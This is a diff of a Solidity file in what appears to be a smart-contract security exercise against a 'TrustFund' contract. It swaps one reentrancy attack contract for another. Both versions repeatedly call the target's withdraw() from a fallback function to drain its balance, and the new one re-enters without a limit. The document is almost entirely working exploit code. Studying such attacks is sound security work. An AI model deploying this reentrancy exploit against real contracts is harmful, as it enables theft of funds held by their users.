@@ -1,28 +1,15 @@
 pragma solidity 0.4.24;
 import "./TrustFund.sol";
 
-contract TrustFundAttack {
-
-    uint i;
-
-    function () external payable {
-        if (i < 10) {
-            this.attack(msg.sender);
-        }
+contract attack{
+    address public aimAddr;
+    
+    function reen(address _addr) public {
+        aimAddr = _addr;
+        _addr.call(bytes4(keccak256("withdraw()")));
     }
-
-    function attack(address _victim) external returns(bool) {
-        TrustFund victim = TrustFund(_victim);
-
-        victim.withdraw();
-        i++;
+    
+    function () public payable{
+        aimAddr.call(bytes4(keccak256("withdraw()")));
     }
-
-    function getBalance() external view returns(uint256) {
-        return address(this).balance;
-    }
-
-    function withdraw() external {
-        msg.sender.transfer(address(this).balance);
-    }
-}x
+}
